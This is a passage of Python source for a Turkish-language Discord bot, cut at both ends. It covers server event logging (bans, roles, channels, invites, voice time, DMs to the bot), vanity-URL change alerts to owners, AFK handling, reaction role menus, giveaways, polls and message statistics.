    embed.set_thumbnail(url=user.display_avatar.url if user.display_avatar else None)
    embed.add_field(name="Kullanıcı", value=f"{user.mention} ({user})", inline=True)
    embed.set_footer(text=f"Kullanıcı ID: {user.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_member_unban(guild, user):
    if not GENERAL_LOG_CHANNEL_ID or guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="Üye Yasağı Kaldırıldı",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.set_thumbnail(url=user.display_avatar.url if user.display_avatar else None)
    embed.add_field(name="Kullanıcı", value=f"{user.mention} ({user})", inline=True)
    embed.set_footer(text=f"Kullanıcı ID: {user.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_member_update(before, after):
    if not GENERAL_LOG_CHANNEL_ID or before.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    if before.roles != after.roles:
        added_roles = [role for role in after.roles if role not in before.roles]
        removed_roles = [role for role in before.roles if role not in after.roles]
        
        if added_roles or removed_roles:
            embed = discord.Embed(
                title="Rol Değişikliği",
                color=0x9b59b6,
                timestamp=datetime.datetime.now()
            )
            embed.add_field(name="Kullanıcı", value=f"{after.mention} ({after})", inline=True)
            
            if added_roles:
                embed.add_field(name="Eklenen Roller", value=", ".join([r.mention for r in added_roles]), inline=False)
            if removed_roles:
                embed.add_field(name="Kaldırılan Roller", value=", ".join([r.mention for r in removed_roles]), inline=False)
            
            embed.set_footer(text=f"Kullanıcı ID: {after.id}")
            await log_channel.send(embed=embed)
    
    if before.nick != after.nick:
        embed = discord.Embed(
            title="Takma Ad Değişikliği",
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Kullanıcı", value=f"{after.mention} ({after})", inline=True)
        embed.add_field(name="Eski Takma Ad", value=before.nick or "Yok", inline=True)
        embed.add_field(name="Yeni Takma Ad", value=after.nick or "Yok", inline=True)
        embed.set_footer(text=f"Kullanıcı ID: {after.id}")
        await log_channel.send(embed=embed)

@bot.event
async def on_guild_channel_create(channel):
    if not GENERAL_LOG_CHANNEL_ID or channel.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    channel_type = "Metin Kanalı" if isinstance(channel, discord.TextChannel) else "Ses Kanalı" if isinstance(channel, discord.VoiceChannel) else "Kategori" if isinstance(channel, discord.CategoryChannel) else "Kanal"
    
    embed = discord.Embed(
        title="Kanal Oluşturuldu",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Kanal", value=channel.mention if hasattr(channel, 'mention') else channel.name, inline=True)
    embed.add_field(name="Tür", value=channel_type, inline=True)
    embed.set_footer(text=f"Kanal ID: {channel.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_guild_channel_delete(channel):
    if not GENERAL_LOG_CHANNEL_ID or channel.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    channel_type = "Metin Kanalı" if isinstance(channel, discord.TextChannel) else "Ses Kanalı" if isinstance(channel, discord.VoiceChannel) else "Kategori" if isinstance(channel, discord.CategoryChannel) else "Kanal"
    
    embed = discord.Embed(
        title="Kanal Silindi",
        color=0xff0000,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Kanal", value=channel.name, inline=True)
    embed.add_field(name="Tür", value=channel_type, inline=True)
    embed.set_footer(text=f"Kanal ID: {channel.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_guild_role_create(role):
    if not GENERAL_LOG_CHANNEL_ID or role.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="Rol Oluşturuldu",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Rol", value=role.mention, inline=True)
    embed.add_field(name="Renk", value=str(role.color), inline=True)
    embed.set_footer(text=f"Rol ID: {role.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_guild_role_delete(role):
    if not GENERAL_LOG_CHANNEL_ID or role.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="Rol Silindi",
        color=0xff0000,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Rol", value=role.name, inline=True)
    embed.add_field(name="Renk", value=str(role.color), inline=True)
    embed.set_footer(text=f"Rol ID: {role.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    if not GENERAL_LOG_CHANNEL_ID or member.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="👋 Üye Ayrıldı",
        color=0xff6b6b,
        timestamp=datetime.datetime.now()
    )
    embed.set_thumbnail(url=member.display_avatar.url if member.display_avatar else None)
    embed.add_field(name="Kullanıcı", value=f"{member.mention} ({member})", inline=True)
    embed.add_field(name="Hesap Oluşturma", value=f"<t:{int(member.created_at.timestamp())}:R>", inline=True)
    embed.add_field(name="Katılma Tarihi", value=f"<t:{int(member.joined_at.timestamp())}:R>" if member.joined_at else "Bilinmiyor", inline=True)
    embed.add_field(name="Rol Sayısı", value=str(len(member.roles) - 1), inline=True)
    embed.set_footer(text=f"Kullanıcı ID: {member.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_guild_update(before, after):
    global PROTECTED_VANITY_URL
    
    if not GENERAL_LOG_CHANNEL_ID or before.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    owner_mentions = " ".join([f"<@{owner_id}>" for owner_id in OWNER_IDS])
    
    if before.vanity_url_code != after.vanity_url_code:
        old_url = before.vanity_url_code or PROTECTED_VANITY_URL
        new_url = after.vanity_url_code
        
        print(f"🚨 URL DEĞİŞİKLİĞİ TESPİT EDİLDİ! Eski: {old_url} -> Yeni: {new_url}")
        
        embed = discord.Embed(
            title="🚨🚨🚨 ACİL: SUNUCU URL'Sİ DEĞİŞTİ! 🚨🚨🚨",
            description="**DİKKAT!** Sunucu vanity URL'si değiştirildi!\n\n⚠️ Hemen kontrol edin ve gerekirse manuel olarak düzeltin!",
            color=0xff0000,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="❌ Eski URL", value=f"`discord.gg/{old_url}`" if old_url else "Yok", inline=True)
        embed.add_field(name="➡️ Yeni URL", value=f"`discord.gg/{new_url}`" if new_url else "**KALDIRILDI!**", inline=True)
        embed.add_field(name="⚡ Aksiyon", value="Sunucu Ayarları > Vanity URL bölümünden kontrol edin!", inline=False)
        embed.set_footer(text="🛡️ DEHŞET URL Koruma Sistemi | Anında Uyarı")
        
        await log_channel.send(content=f"🚨🚨🚨 **ACİL URL DEĞİŞİKLİĞİ!** {owner_mentions} 🚨🚨🚨", embed=embed)
        
        for owner_id in OWNER_IDS:
            try:
                owner = await bot.fetch_user(owner_id)
                if owner:
                    dm_embed = discord.Embed(
                        title="🚨 ACİL: SUNUCU URL DEĞİŞTİ!",
                        description=f"**{after.name}** sunucusunun URL'si değiştirildi!",
                        color=0xff0000,
                        timestamp=datetime.datetime.now()
                    )
                    dm_embed.add_field(name="Eski", value=f"discord.gg/{old_url}" if old_url else "Yok", inline=True)
                    dm_embed.add_field(name="Yeni", value=f"discord.gg/{new_url}" if new_url else "Kaldırıldı", inline=True)
                    await owner.send(embed=dm_embed)
            except:
                pass
        
        if old_url:
            PROTECTED_VANITY_URL = old_url
    
    if before.name != after.name:
        embed = discord.Embed(
            title="🏷️ Sunucu Adı Değişti",
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Eski Ad", value=before.name, inline=True)
        embed.add_field(name="Yeni Ad", value=after.name, inline=True)
        await log_channel.send(embed=embed)
    
    if before.icon != after.icon:
        embed = discord.Embed(
            title="🖼️ Sunucu İkonu Değişti",
            color=0x9b59b6,
            timestamp=datetime.datetime.now()
        )
        if after.icon:
            embed.set_thumbnail(url=after.icon.url)
        embed.add_field(name="Durum", value="Yeni ikon ayarlandı" if after.icon else "İkon kaldırıldı", inline=True)
        await log_channel.send(embed=embed)
    
    if before.banner != after.banner:
        embed = discord.Embed(
            title="🎨 Sunucu Banner'ı Değişti",
            color=0xe74c3c,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Durum", value="Yeni banner ayarlandı" if after.banner else "Banner kaldırıldı", inline=True)
        await log_channel.send(embed=embed)
    
    if before.description != after.description:
        embed = discord.Embed(
            title="📝 Sunucu Açıklaması Değişti",
            color=0x2ecc71,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Eski Açıklama", value=before.description or "Yok", inline=False)
        embed.add_field(name="Yeni Açıklama", value=after.description or "Yok", inline=False)
        await log_channel.send(embed=embed)

@bot.event
async def on_invite_create(invite):
    if not GENERAL_LOG_CHANNEL_ID or invite.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="🔗 Davet Oluşturuldu",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Davet Kodu", value=f"discord.gg/{invite.code}", inline=True)
    embed.add_field(name="Oluşturan", value=f"{invite.inviter.mention}" if invite.inviter else "Bilinmiyor", inline=True)
    embed.add_field(name="Kanal", value=invite.channel.mention if invite.channel else "Bilinmiyor", inline=True)
    embed.add_field(name="Max Kullanım", value=str(invite.max_uses) if invite.max_uses else "Sınırsız", inline=True)
    embed.add_field(name="Süre", value=f"{invite.max_age // 3600} saat" if invite.max_age else "Süresiz", inline=True)
    embed.set_footer(text=f"Davet ID: {invite.code}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_invite_delete(invite):
    if not GENERAL_LOG_CHANNEL_ID or invite.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="🔗 Davet Silindi",
        color=0xff0000,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Davet Kodu", value=f"discord.gg/{invite.code}", inline=True)
    embed.add_field(name="Kanal", value=invite.channel.mention if invite.channel else "Bilinmiyor", inline=True)
    embed.set_footer(text=f"Davet ID: {invite.code}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_webhooks_update(channel):
    if not GENERAL_LOG_CHANNEL_ID or channel.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="🪝 Webhook Güncellendi",
        color=0xf39c12,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Kanal", value=channel.mention, inline=True)
    embed.set_footer(text=f"Kanal ID: {channel.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_guild_emojis_update(guild, before, after):
    if not GENERAL_LOG_CHANNEL_ID or guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    added_emojis = [e for e in after if e not in before]
    removed_emojis = [e for e in before if e not in after]
    
    if added_emojis:
        embed = discord.Embed(
            title="😀 Emoji Eklendi",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        emoji_list = " ".join([str(e) for e in added_emojis[:10]])
        embed.add_field(name="Eklenen Emojiler", value=emoji_list or "Gösterilemiyor", inline=False)
        embed.set_footer(text=f"Toplam: {len(added_emojis)} emoji")
        await log_channel.send(embed=embed)
    
    if removed_emojis:
        embed = discord.Embed(
            title="😢 Emoji Silindi",
            color=0xff0000,
            timestamp=datetime.datetime.now()
        )
        emoji_names = ", ".join([e.name for e in removed_emojis[:10]])
        embed.add_field(name="Silinen Emojiler", value=emoji_names or "Gösterilemiyor", inline=False)
        embed.set_footer(text=f"Toplam: {len(removed_emojis)} emoji")
        await log_channel.send(embed=embed)

@bot.event
async def on_guild_stickers_update(guild, before, after):
    if not GENERAL_LOG_CHANNEL_ID or guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    added_stickers = [s for s in after if s not in before]
    removed_stickers = [s for s in before if s not in after]
    
    if added_stickers:
        embed = discord.Embed(
            title="🎨 Sticker Eklendi",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        sticker_names = ", ".join([s.name for s in added_stickers[:10]])
        embed.add_field(name="Eklenen Stickerlar", value=sticker_names, inline=False)
        embed.set_footer(text=f"Toplam: {len(added_stickers)} sticker")
        await log_channel.send(embed=embed)
    
    if removed_stickers:
        embed = discord.Embed(
            title="🗑️ Sticker Silindi",
            color=0xff0000,
            timestamp=datetime.datetime.now()
        )
        sticker_names = ", ".join([s.name for s in removed_stickers[:10]])
        embed.add_field(name="Silinen Stickerlar", value=sticker_names, inline=False)
        embed.set_footer(text=f"Toplam: {len(removed_stickers)} sticker")
        await log_channel.send(embed=embed)

@bot.event
async def on_guild_channel_update(before, after):
    if not GENERAL_LOG_CHANNEL_ID or before.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    if before.overwrites != after.overwrites:
        embed = discord.Embed(
            title="🔒 Kanal İzinleri Değişti",
            color=0xe67e22,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Kanal", value=after.mention, inline=True)
        embed.set_footer(text=f"Kanal ID: {after.id}")
        await log_channel.send(embed=embed)
    
    if before.name != after.name:
        embed = discord.Embed(
            title="✏️ Kanal Adı Değişti",
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Kanal", value=after.mention, inline=True)
        embed.add_field(name="Eski Ad", value=before.name, inline=True)
        embed.add_field(name="Yeni Ad", value=after.name, inline=True)
        embed.set_footer(text=f"Kanal ID: {after.id}")
        await log_channel.send(embed=embed)

@bot.event
async def on_voice_state_update(member, before, after):
    global voice_join_times
    
    if member.id == bot.user.id:
        if before.channel is not None and after.channel is None:
            if voice_reconnect_enabled and VOICE_CHANNEL_ID:
                asyncio.create_task(reconnect_to_voice())
    
    if member.guild.id == ALLOWED_LOG_GUILD_ID and not member.bot:
        if before.channel is None and after.channel is not None:
            voice_join_times[member.id] = datetime.datetime.now()
        
        elif before.channel is not None and after.channel is None:
            if member.id in voice_join_times:
                join_time = voice_join_times[member.id]
                leave_time = datetime.datetime.now()
                duration = leave_time - join_time
                
                total_seconds = int(duration.total_seconds())
                hours = total_seconds // 3600
                minutes = (total_seconds % 3600) // 60
                seconds = total_seconds % 60
                
                if hours > 0:
                    duration_str = f"{hours} saat {minutes} dakika {seconds} saniye"
                elif minutes > 0:
                    duration_str = f"{minutes} dakika {seconds} saniye"
                else:
                    duration_str = f"{seconds} saniye"
                
                del voice_join_times[member.id]
                
                log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
                if log_channel:
                    embed = discord.Embed(
                        title="🎧 Ses Süresi Raporu",
                        color=0x9b59b6,
                        timestamp=datetime.datetime.now()
                    )
                    embed.add_field(name="Kullanıcı", value=f"{member.mention}\n`{member.name}`", inline=True)
                    embed.add_field(name="Kanal", value=before.channel.name, inline=True)
                    embed.add_field(name="Süre", value=f"**{duration_str}**", inline=False)
                    embed.add_field(name="Giriş", value=join_time.strftime("%H:%M:%S"), inline=True)
                    embed.add_field(name="Çıkış", value=leave_time.strftime("%H:%M:%S"), inline=True)
                    embed.set_thumbnail(url=member.display_avatar.url)
                    embed.set_footer(text=f"Kullanıcı ID: {member.id}")
                    await log_channel.send(embed=embed)
    
    if not GENERAL_LOG_CHANNEL_ID or member.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    if before.channel != after.channel:
        if before.channel is None and after.channel is not None:
            embed = discord.Embed(
                title="🔊 Ses Kanalına Katıldı",
                color=0x00ff00,
                timestamp=datetime.datetime.now()
            )
            embed.add_field(name="Kullanıcı", value=f"{member.mention} ({member})", inline=True)
            embed.add_field(name="Kanal", value=after.channel.name, inline=True)
        elif before.channel is not None and after.channel is None:
            embed = discord.Embed(
                title="🔇 Ses Kanalından Ayrıldı",
                color=0xff0000,
                timestamp=datetime.datetime.now()
            )
            embed.add_field(name="Kullanıcı", value=f"{member.mention} ({member})", inline=True)
            embed.add_field(name="Kanal", value=before.channel.name, inline=True)
        else:
            embed = discord.Embed(
                title="🔄 Ses Kanalı Değiştirdi",
                color=0xffa500,
                timestamp=datetime.datetime.now()
            )
            embed.add_field(name="Kullanıcı", value=f"{member.mention} ({member})", inline=True)
            embed.add_field(name="Eski Kanal", value=before.channel.name, inline=True)
            embed.add_field(name="Yeni Kanal", value=after.channel.name, inline=True)
        
        embed.set_footer(text=f"Kullanıcı ID: {member.id}")
        await log_channel.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    if isinstance(message.channel, discord.DMChannel):
        try:
            log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
            if log_channel:
                embed = discord.Embed(
                    title="📨 BOTA GELEN DM",
                    description=message.content[:2000] if message.content else "[Medya/Dosya]",
                    color=0x3498db,
                    timestamp=datetime.datetime.now()
                )
                embed.add_field(
                    name="Gönderen",
                    value=f"**{message.author.name}#{message.author.discriminator}\n**ID:** {message.author.id}",
                    inline=False
                )
                embed.set_thumbnail(url=message.author.display_avatar.url)
                embed.set_footer(text="DM Log Sistemi")
                await log_channel.send(embed=embed)
        except Exception as e:
            print(f"DM log hatası: {e}")
    
    if message.guild:
        guild_id = str(message.guild.id)
        
        if guild_id not in STATS:
            STATS[guild_id] = {"daily": {}, "weekly": {}, "total_messages": 0}
        
        today = datetime.datetime.now().strftime("%Y-%m-%d")
        if today not in STATS[guild_id]["daily"]:
            STATS[guild_id]["daily"][today] = 0
        STATS[guild_id]["daily"][today] += 1
        STATS[guild_id]["total_messages"] = STATS[guild_id].get("total_messages", 0) + 1
        
        if random.randint(1, 10) == 1:
            save_stats()
    
    if message.content.lower() == "deniz":
        await message.reply("allah")
    elif message.content.lower() == "allah":
        await message.reply("deniz")
    
    global afk_users
    user_id = str(message.author.id)
    
    if user_id in afk_users:
        afk_data = afk_users[user_id]
        afk_time = datetime.datetime.fromisoformat(afk_data["time"])
        now = datetime.datetime.now()
        duration = now - afk_time
        
        total_seconds = int(duration.total_seconds())
        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        
        if hours > 0:
            duration_str = f"{hours} saat {minutes} dakika"
        elif minutes > 0:
            duration_str = f"{minutes} dakika"
        else:
            duration_str = "birkaç saniye"
        
        del afk_users[user_id]
        save_afk_users()
        
        try:
            embed = discord.Embed(
                title="👋 Hoş Geldin!",
                description=f"{message.author.mention} artık AFK değil!",
                color=0x00ff00
            )
            embed.add_field(name="AFK Süresi", value=duration_str, inline=True)
            afk_msg = await message.channel.send(embed=embed)
            await asyncio.sleep(5)
            await afk_msg.delete()
        except:
            pass
    
    for mentioned_user in message.mentions:
        mentioned_id = str(mentioned_user.id)
        if mentioned_id in afk_users:
            afk_data = afk_users[mentioned_id]
            afk_time = datetime.datetime.fromisoformat(afk_data["time"])
            now = datetime.datetime.now()
            duration = now - afk_time
            
            total_seconds = int(duration.total_seconds())
            hours = total_seconds // 3600
            minutes = (total_seconds % 3600) // 60
            
            if hours > 0:
                duration_str = f"{hours} saat {minutes} dakika"
            elif minutes > 0:
                duration_str = f"{minutes} dakika"
            else:
                duration_str = "birkaç saniye"
            
            embed = discord.Embed(
                title="💤 Bu Kullanıcı AFK",
                description=f"**{mentioned_user.name}** şu an AFK!",
                color=0x9b59b6
            )
            embed.add_field(name="Sebep", value=afk_data["reason"], inline=True)
            embed.add_field(name="Süre", value=f"{duration_str} önce", inline=True)
            await message.channel.send(embed=embed, delete_after=10)
    
    await bot.process_commands(message)

async def create_giveaway_slash(interaction: discord.Interaction, süre: str, ödül: str, kazanan_sayısı: int = 1):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    time_units = {"s": 1, "d": 86400, "h": 3600, "m": 60}
    try:
        unit = süre[-1].lower()
        amount = int(süre[:-1])
        seconds = amount * time_units.get(unit, 60)
    except:
        await interaction.response.send_message("Geçersiz süre! Örnek: 1s, 1d, 1h, 30m", ephemeral=True)
        return
    
    end_time = datetime.datetime.now() + datetime.timedelta(seconds=seconds)
    
    embed = discord.Embed(
        title="🎉 ÇEKİLİŞ 🎉",
        description=f"**Ödül:** {ödül}\n**Kazanan Sayısı:** {kazanan_sayısı}\n**Bitiş:** <t:{int(end_time.timestamp())}:R>",
        color=0xff69b4
    )
    embed.add_field(name="Katılmak için", value="🎉 emojisine tıkla!", inline=False)
    embed.set_footer(text=f"Başlatan: {interaction.user.name}")
    
    await interaction.response.send_message("Çekiliş oluşturuluyor...", ephemeral=True)
    msg = await interaction.channel.send(embed=embed)
    await msg.add_reaction("🎉")
    
    active_giveaways[str(msg.id)] = {
        "channel_id": interaction.channel.id,
        "end_time": end_time.timestamp(),
        "prize": ödül,
        "winners": kazanan_sayısı,
        "host": interaction.user.id
    }
    
    await asyncio.sleep(seconds)
    
    if str(msg.id) in active_giveaways:
        try:
            msg = await interaction.channel.fetch_message(msg.id)
            reaction = discord.utils.get(msg.reactions, emoji="🎉")
            
            if reaction:
                users = [u async for u in reaction.users() if not u.bot]
                
                if len(users) == 0:
                    embed.description = f"**Ödül:** {ödül}\n\n❌ Yeterli katılımcı yok!"
                    embed.color = 0xff0000
                else:
                    winners = random.sample(users, min(kazanan_sayısı, len(users)))
                    winner_mentions = ", ".join([w.mention for w in winners])
                    embed.description = f"**Ödül:** {ödül}\n\n🎉 **Kazanan(lar):** {winner_mentions}"
                    embed.color = 0x00ff00
                    await interaction.channel.send(f"🎉 Tebrikler {winner_mentions}! **{ödül}** kazandınız!")
                
                await msg.edit(embed=embed)
            
            del active_giveaways[str(msg.id)]
        except:
            pass

async def create_poll_slash(interaction: discord.Interaction, soru: str, seçenekler: str):
    options = [o.strip() for o in seçenekler.split(",")][:10]
    
    if len(options) < 2:
        await interaction.response.send_message("En az 2 seçenek gerekli!", ephemeral=True)
        return
    
    emojis = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    
    description = ""
    for i, option in enumerate(options):
        description += f"{emojis[i]} {option}\n"
    
    embed = discord.Embed(
        title=f"📊 {soru}",
        description=description,
        color=0x3498db
    )
    embed.set_footer(text=f"Anket: {interaction.user.name}")
    
    await interaction.response.send_message("Anket oluşturuluyor...", ephemeral=True)
    msg = await interaction.channel.send(embed=embed)
    
    for i in range(len(options)):
        await msg.add_reaction(emojis[i])

async def create_role_menu_slash(interaction: discord.Interaction, başlık: str, roller: str):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    role_list = [r.strip() for r in roller.split(",")]
    role_data = {}
    description = ""
    
    for item in role_list:
        try:
            parts = item.split(":")
            emoji = parts[0].strip()
            role_mention = parts[1].strip()
            role_id = int(role_mention.replace("<@&", "").replace(">", ""))
            role = interaction.guild.get_role(role_id)
            if role:
                role_data[emoji] = role_id
                description += f"{emoji} - {role.mention}\n"
        except:
            continue
    
    if not role_data:
        await interaction.response.send_message("Geçerli rol bulunamadı! Format: emoji:@rol", ephemeral=True)
        return
    
    embed = discord.Embed(
        title=f"🎭 {başlık}",
        description=description + "\n**Rol almak/bırakmak için emojiye tıkla!**",
        color=0x9b59b6
    )
    
    await interaction.response.send_message("Rol menüsü oluşturuluyor...", ephemeral=True)
    msg = await interaction.channel.send(embed=embed)
    
    ROLE_MENUS[str(msg.id)] = role_data
    save_role_menus()
    
    for emoji in role_data.keys():
        try:
            await msg.add_reaction(emoji)
        except:
            pass

@bot.event
async def on_raw_reaction_add(payload):
    if payload.user_id == bot.user.id:
        return
    
    message_id = str(payload.message_id)
    if message_id in ROLE_MENUS:
        guild = bot.get_guild(payload.guild_id)
        if not guild:
            return
        
        member = guild.get_member(payload.user_id)
        if not member:
            return
        
        emoji = str(payload.emoji)
        if emoji in ROLE_MENUS[message_id]:
            role_id = ROLE_MENUS[message_id][emoji]
            role = guild.get_role(role_id)
            if role:
                try:
                    await member.add_roles(role)
                except:
                    pass

@bot.event
async def on_raw_reaction_remove(payload):
    message_id = str(payload.message_id)
    if message_id in ROLE_MENUS:
        guild = bot.get_guild(payload.guild_id)
        if not guild:
            return
        
        member = guild.get_member(payload.user_id)
        if not member:
            return
        
        emoji = str(payload.emoji)
        if emoji in ROLE_MENUS[message_id]:
            role_id = ROLE_MENUS[message_id][emoji]
            role = guild.get_role(role_id)
            if role:
                try:
                    await member.remove_roles(role)
                except:
                    pass

async def show_stats_slash(interaction: discord.Interaction):
    guild = interaction.guild
    guild_id = str(guild.id)
    
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    today_messages = 0
    week_messages = 0
    total_messages = 0
    
    if guild_id in STATS:
        today_messages = STATS[guild_id]["daily"].get(today, 0)
        total_messages = STATS[guild_id].get("total_messages", 0)
        
        for i in range(7):
            day = (datetime.datetime.now() - datetime.timedelta(days=i)).strftime("%Y-%m-%d")
            week_messages += STATS[guild_id]["daily"].get(day, 0)
    
    online = len([m for m in guild.members if m.status != discord.Status.offline])
    
    embed = discord.Embed(
        title=f"📊 {guild.name} İstatistikleri",
        color=0x3498db
    )
    embed.add_field(name="👥 Toplam Üye", value=f"**{guild.member_count}**", inline=True)
    embed.add_field(name="🟢 Çevrimiçi", value=f"**{online}**", inline=True)
    embed.add_field(name="🤖 Bot Sayısı", value=f"**{len([m for m in guild.members if m.bot])}**", inline=True)
    embed.add_field(name="💬 Bugün Mesaj", value=f"**{today_messages:,}**", inline=True)
    embed.add_field(name="📅 Bu Hafta", value=f"**{week_messages:,}**", inline=True)
    embed.add_field(name="📨 Toplam Mesaj", value=f"**{total_messages:,}**", inline=True)
    embed.add_field(name="📝 Kanal Sayısı", value=f"**{len(guild.channels)}**", inline=True)
    embed.add_field(name="🎭 Rol Sayısı", value=f"**{len(guild.roles)}**", inline=True)
    embed.add_field(name="🚀 Boost", value=f"**{guild.premium_subscription_count}** (Seviye {guild.premium_tier})", inline=True)
    
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    
    created = guild.created_at.strftime("%d.%m.%Y")
    embed.set_footer(text=f"Sunucu Kuruldu: {created}")
    
    await interaction.response.send_message(embed=embed)

@bot.command(name="istatistik", aliases=["stats"])
async def prefix_stats(ctx):
    guild = ctx.guild
    guild_id = str(guild.id)
    
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    today_messages = 0
    week_messages = 0
    total_messages = 0
    
    if guild_id in STATS:
        today_messages = STATS[guild_id]["daily"].get(today, 0)
        total_messages = STATS[guild_id].get("total_messages", 0)
        
        for i in range(7):
            day = (datetime.datetime.now() - datetime.timedelta(days=i)).strftime("%Y-%m-%d")
            week_messages += STATS[guild_id]["daily"].get(day, 0)
    
    online = len([m for m in guild.members if m.status != discord.Status.offline])
    
    embed = discord.Embed(
        title=f"📊 {guild.name} İstatistikleri",
        color=0x3498db
    )
    embed.add_field(name="👥 Toplam Üye", value=f"**{guild.member_count}**", inline=True)
    embed.add_field(name="🟢 Çevrimiçi", value=f"**{online}**", inline=True)
    embed.add_field(name="🤖 Bot Sayısı", value=f"**{len([m for m in guild.members if m.bot])}**", inline=True)
    embed.add_field(name="💬 Bugün Mesaj", value=f"**{today_messages:,}**", inline=True)
    embed.add_field(name="📅 Bu Hafta", value=f"**{week_messages:,}**", inline=True)
    embed.add_field(name="📨 Toplam Mesaj", value=f"**{total_messages:,}**", inline=True)
    embed.add_field(name="📝 Kanal Sayısı", value=f"**{len(guild.channels)}**", inline=True)
    embed.add_field(name="🎭 Rol Sayısı", value=f"**{len(guild.roles)}**", inline=True)
    embed.add_field(name="🚀 Boost", value=f"**{guild.premium_subscription_count}** (Seviye {guild.premium_tier})", inline=True)
    
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    
    created = guild.created_at.strftime("%d.%m.%Y")
    embed.set_footer(text=f"Sunucu Kuruldu: {created}")
    
    await ctx.reply(embed=embed)

@bot.command(name="anket", aliases=["poll"])
async def prefix_anket(ctx, *, icerik: str = None):
    if not icerik:
        embed = discord.Embed(
            title="📊 ANKET KOMUTU",
            description="Anket oluşturmak için aşağıdaki formatı kullan:",
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(
            name="📝 Kullanım",
            value="`!anket <soru> | <seçenek1>, <seçenek2>, ...`",
            inline=False
        )
        embed.add_field(
            name="📌 Örnek",
            value="`!anket En iyi renk hangisi? | Kırmızı, Mavi, Yeşil`",
            inline=False
        )
        embed.add_field(
            name="ℹ️ Bilgi",
